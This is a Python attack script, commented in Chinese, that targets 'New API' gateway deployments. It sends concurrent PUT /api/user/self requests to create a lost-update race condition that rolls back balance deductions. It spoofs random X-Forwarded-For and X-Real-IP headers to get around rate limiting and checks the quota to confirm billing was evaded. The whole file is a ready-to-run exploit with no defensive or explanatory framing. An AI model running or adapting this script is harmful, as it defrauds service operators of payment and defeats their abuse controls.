#!/usr/bin/env python3
"""
New API 漏洞 #7 — Lost Update 护盾
====================================
高频 PUT /api/user/self 制造竞争条件，阻止余额扣费。

原理:
  扣费流程: 读余额 → 计算 → 写回
  护盾: 在「读→写」窗口中插入大量 PUT 请求
  结果: 扣费因版本号/行锁冲突而回滚

用法:
  python3 shield.py --base https://目标 --cookie "session=xxx" --uid 21 --shield 15 --selftest
"""

import asyncio, ssl, json, random, argparse, time, os
from urllib.parse import urlparse

stats = {"200": 0, "4xx": 0, "429": 0, "err": 0}
running = True
STOP = "/tmp/shield_stop"

def rip():
    return ".".join(str(random.randint(1, 254)) for _ in range(4))

def build_request(method, path, host, args, body=None):
    lines = [f"{method} {path} HTTP/1.1", f"Host: {host}",
             "Content-Type: application/json", f"New-Api-User: {args.uid}",
             "Connection: keep-alive"]
    if body is not None:
        lines.append(f"Content-Length: {len(body)}")
    if args.cookie:
        ck = args.cookie if args.cookie.startswith("session=") else f"session={args.cookie}"
        lines.append(f"Cookie: {ck}")
    if args.access_token:
        lines.append(f"Authorization: {args.access_token}")
    if args.xff:
        ip = rip()
        lines.append(f"X-Forwarded-For: {ip}")
        lines.append(f"X-Real-IP: {ip}")
    req = "\r\n".join(lines) + "\r\n\r\n"
    if body is not None:
        req = req.encode() + body
    else:
        req = req.encode()
    return req

async def read_resp(reader):
    data = b""
    while b"\r\n\r\n" not in data:
        chunk = await reader.read(4096)
        if not chunk:
            return None, None
        data += chunk
    head, _, rest = data.partition(b"\r\n\r\n")
    try:
        status = int(head.split(b" ", 2)[1])
    except Exception:
        status = 0
    cl = 0; chunked = False
    for ln in head.split(b"\r\n"):
        if ln.lower().startswith(b"content-length:"):
            try: cl = int(ln.split(b":", 1)[1].strip())
            except: cl = 0
        elif ln.lower().startswith(b"transfer-encoding:") and b"chunked" in ln.lower():
            chunked = True
    body = rest
    if chunked:
        result = b""
        while True:
            while b"\r\n" not in body:
                chunk = await reader.read(4096)
                if not chunk: return status, result
                body += chunk
            size_line, _, body = body.partition(b"\r\n")
            try: size = int(size_line.strip(), 16)
            except: return status, result
            if size == 0: break
            while len(body) < size + 2:
                chunk = await reader.read(4096)
                if not chunk: break
                body += chunk
            result += body[:size]
            body = body[size + 2:]
        return status, result
    else:
        while len(body) < cl:
            chunk = await reader.read(cl - len(body))
            if not chunk: break
            body += chunk
        return status, body

async def read_quota(host, port, https, args, ssl_ctx):
    for _ in range(8):
        try:
            reader, writer = await asyncio.open_connection(host, port, ssl=ssl_ctx if https else None)
            req = build_request("GET", "/api/user/self", host, args)
            writer.write(req); await writer.drain()
            status, body = await read_resp(reader)
            try: writer.close()
            except: pass
            if status == 200 and body:
                d = json.loads(body.decode("utf-8", "replace"))
                q = d.get("data", {}).get("quota")
                if q is not None: return q
        except: pass
        await asyncio.sleep(1.0)
    return None

async def worker(host, port, https, args, ssl_ctx, wid):
    body = json.dumps({"language": "en"}).encode() if args.payload_kb <= 0 \
        else json.dumps({"sidebar_modules": "A" * (args.payload_kb * 1024)}).encode()
    reader = writer = None
    backoff = 0.0
    while running:
        try:
            if writer is None:
                reader, writer = await asyncio.open_connection(host, port, ssl=ssl_ctx if https else None)
            writer.write(build_request("PUT", "/api/user/self", host, args, body))
            await writer.drain()
            st, _ = await read_resp(reader)
            if st is None:
                try: writer.close()
                except: pass
                writer = None; continue
            if st == 200:
                stats["200"] += 1; backoff = 0.0
            elif st == 429:
                stats["429"] += 1
                backoff = min(2.0, (backoff or 0.1) * 2)
                await asyncio.sleep(backoff + random.random() * 0.1)
            elif 400 <= st < 500:
                stats["4xx"] += 1
            else:
                stats["err"] += 1
        except:
            stats["err"] += 1
            try: writer.close()
            except: pass
            writer = None; await asyncio.sleep(0.2)

async def reporter(args, host, port, https, ssl_ctx, t_end):
    global running
    q0 = await read_quota(host, port, https, args, ssl_ctx) if args.selftest else None
    print(f"[shield] 起始余额={q0}", flush=True)
    while running:
        await asyncio.sleep(5)
        extra = ""
        if args.selftest:
            q = await read_quota(host, port, https, args, ssl_ctx)
            extra = f" | 余额={q} (Δ={(q-q0) if (q is not None and q0 is not None) else 'NA'})"
        print(f"[shield] {dict(stats)}{extra}", flush=True)
        if os.path.exists(STOP):
            running = False; return
        if t_end and time.time() >= t_end:
            running = False; return

async def main_async(args):
    global running
    u = urlparse(args.base)
    host = u.hostname; https = (u.scheme == "https"); port = u.port or (443 if https else 80)
    ssl_ctx = ssl._create_unverified_context() if https else None
    t_end = (time.time() + args.seconds) if args.seconds else 0
    if os.path.exists(STOP): os.remove(STOP)
    print(f"[shield] {args.shield} 并发 -> {args.base}  XFF={'on' if args.xff else 'off'} "
          f"payload={args.payload_kb}KB", flush=True)
    tasks = [asyncio.create_task(worker(host, port, https, args, ssl_ctx, i))
             for i in range(args.shield)]
    rep = asyncio.create_task(reporter(args, host, port, https, ssl_ctx, t_end))
    await rep
    for t in tasks: t.cancel()
    qf = await read_quota(host, port, https, args, ssl_ctx) if args.selftest else None
    print(f"[shield] 收尾: {dict(stats)} 余额={qf}", flush=True)

def main():
    ap = argparse.ArgumentParser(description="New API Lost Update 护盾")
    ap.add_argument("--base", required=True)
    ap.add_argument("--cookie", default="")
    ap.add_argument("--access-token", dest="access_token", default="")
    ap.add_argument("--uid", type=int, required=True)
    ap.add_argument("--shield", type=int, default=15)
    ap.add_argument("--no-xff", dest="xff", action="store_false")
    ap.add_argument("--payload-kb", type=int, default=0)
    ap.add_argument("--selftest", action="store_true")
    ap.add_argument("--seconds", type=int, default=0)
    args = ap.parse_args()
    if not (args.cookie or args.access_token):
        raise SystemExit("需要 --cookie 或 --access-token")
    try: asyncio.run(main_async(args))
    except KeyboardInterrupt: pass

if __name__ == "__main__":
    main()
